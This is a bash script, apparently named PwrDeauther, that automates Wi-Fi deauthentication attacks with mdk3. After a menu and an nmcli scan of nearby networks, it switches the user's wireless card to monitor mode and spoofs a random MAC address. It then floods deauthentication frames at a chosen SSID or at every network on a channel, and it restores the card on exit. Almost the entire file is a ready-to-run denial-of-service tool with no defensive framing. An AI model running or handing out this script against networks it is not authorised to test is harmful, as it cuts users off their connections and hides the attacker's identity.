#!/bin/bash

# TERMINAL COLORS
# https://github.com/BlueArduino20/terminal-colors
NO_COLOR="\e[0m"
WHITE="\e[0;17m"
BOLD_WHITE="\e[1;37m"
BLACK="\e[0;30m"
BLUE="\e[0;34m"
BOLD_BLUE="\e[1;34m"
GREEN="\e[0;32m"
BOLD_GREEN="\e[1;32m"
CYAN="\e[0;36m"
BOLD_CYAN="\e[1;36m"
RED="\e[0;31m"
BOLD_RED="\e[1;31m"
PURPLE="\e[0;35m"
BOLD_PURPLE="\e[1;35m"
BROWN="\e[0;33m"
BOLD_YELLOW="\e[1;33m"
GRAY="\e[0;37m"
BOLD_GRAY="\e[1;30m"
# END OF TERMINAL COLORS

function coolexit()
{
clear
sleep 2
ifconfig $AD down
macchanger -p $AD
iwconfig $AD mode managed
ifconfig $AD up
clear
echo -e $BOLD_RED
echo "Thanks for using this script"
echo "Made by BlueArduino20"
exit
}

function title() {
	echo -e $BOLD_GREEN
	echo "    ____	  	____	               __  __	     "
	echo "   / __ \\_      _______/ __ \\___  ____ ___  __/ /_/ /_  ___  _____"
	echo "  / /_/ / | /| / / ___/ / / / _ \\/ __ \`/ / / / __/ __ \\/ _ \\/ ___/"
	echo " / ____/| |/ |/ / /  / /_/ /  __/ /_/ / /_/ / /_/ / / /  __/ /    "
	echo "/_/     |__/|__/_/  /_____/\\___/\\__,_/\\__,_/\\__/_/ /_/\\___/_/     "
	echo -e $BOLD_WHITE
	echo "         		 Automatic MDK3 deauther by BlueArduino20"
}

title
echo -e $BOLD_CYAN
echo " Choose an option:"
echo " "
echo -e "$BOLD_BLUE 1.$BOLD_WHITE Deauth a specific SSID"
echo -e "$BOLD_BLUE 2.$BOLD_WHITE Deauth a whole channel"
echo " "
echo -n -e "$BOLD_WHITE > "
read CHOICE
clear

if [ $CHOICE == 1 ]; then
	title
	echo -e $NO_COLOR
	nmcli dev wifi
	echo " "
	echo -e -n $BOLD_WHITE
	echo -n "Type the target SSID > "
	read SSID
	clear
	ifconfig
	echo -e -n "$BOLD_CYAN Type your wireless interface > "
	read WI
	echo -e $BOLD_GREEN
	echo "\e[1;31mStarting the attack... If you want to stop it press CTRL+C"
	ifconfig $WI down
	iwconfig $WI mode monitor
	macchanger -r $WI
	ifconfig $WI up
	trap coolexit EXIT
	mdk3 $WI d -n $SSID
fi
if [ $CHOICE == 2 ]; then
	title
	echo -e $NO_COLOR
	nmcli dev wifi
	echo " "
	echo -e -n $BOLD_WHITE
	echo -n "Type the target channel > "
	read CH
	clear
	ifconfig
	echo -e -n "$BOLD_CYAN Type your wireless interface > "
	read WI
 	echo -e $BOLD_GREEN
	echo -e "Starting the attack... If you want to stop it press CTRL+C."
	ifconfig $WI down
	iwconfig $WI mode monitor
	macchanger -r $WI
	ifconfig $WI up
	trap coolexit EXIT
	mdk3 $WI d -c $CH
fi
